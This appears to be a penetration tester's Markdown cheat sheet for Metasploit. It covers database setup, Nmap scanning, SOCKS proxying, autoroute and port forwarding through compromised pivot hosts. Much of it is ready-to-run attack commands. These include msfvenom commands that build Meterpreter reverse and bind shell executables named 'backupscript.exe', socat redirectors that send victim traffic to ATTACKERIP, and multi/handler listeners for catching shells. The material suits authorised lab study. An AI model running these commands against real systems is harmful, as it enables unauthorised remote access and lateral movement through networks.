# How to use DB with Metasploit
1)Start PostgreSQL
```
sudo service postgresql start
```
2)Check Service Status
```
sudo service postgresql status
```
3)Initiate MSF DB
```
sudo msfdb init
```
4)Check DB status in MSFCONSOLE
```
msf > db_status
[*] postgresql connected to msf3
```


# How to use NMAP in MSFCONSOLE
1)Connect MSF with PostgreSQL
2)NMAP query
```
db_nmap -p- -A -T4 -sV IP
```
3)Check hosts
```
msf6 > hosts
```
4)Check open services
```
msf6 > services
```


# How to pinsweep
(ping a subnet avalable only from a vitctim)
```
run post/multi/gather/ping_sweep RHOSTS=SUBNET
```


# How to use Socks with Metasploit
```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
(This will setup a socks proxy)
```
socks4 	127.0.0.1 9050
```
(Add it to you **/etc/proxychain.conf**)
```
use post/multi/manage/autoroute
set SESSION ID
set SUBNET SUBNET
run
```
(This will route all the traffic of the Internal subnet via Proxychain)
```
run autoroute -p
```
(this will should you the routes available)
Same(from Meterpreter session): 
```
run autoroute -s 172.16.5.0/23
proxychains nmap IPSUBNET -p3389 -sT -v -Pn
```
(Test example)


# How to (Local)PortForward via Metasploit
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
(Above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. 
Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)


# How to (Remote)PortForward via Metasploit
```
portfwd add -R -l 8081 -p 1234 -L ATTACKERIP
```
(This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081)
```
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run
```
(This setup a lister on port 8080 on out machine)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=PIVOTIP -f exe -o backupscript.exe LPORT=1234
```
(This will create a payload that talks from Victim 2 back to Pivot server. Laslty the portfw will reversefw the traffic from pivot back to us.)


# How to (Remote) PortForward via Metasploit+Socat
```
socat TCP4-LISTEN:8080,fork TCP4:ATTACKERIP:80 (On pivot)
```
(Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18).)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOTIP -f exe -o backupscript.exe LPORT=8080
```
(That will connect back to our re-director, which is running on our Ubuntu server. 
We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.)
Send the payload to the Vitctim2
(Accessible only from Pivot)
use /multi/handler
```
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```
(This setup a listener on our machine listening on 0.0.0.0:80 which is the port that receives traffic from Socat on Pivot)


# How to (Bind) shell via Metasploit+Socat 
(We can create a bind shell payload for Windows and execute it on the Windows host. 
At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.)
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
(This will prepare the blind shell)
```
socat TCP4-LISTEN:8080,fork TCP4:VICTIM2IP:8443 (On Pivot)
```
(We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Vitctim2 server 8443)
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST PIVOTIP
set LPORT 8080
run
```
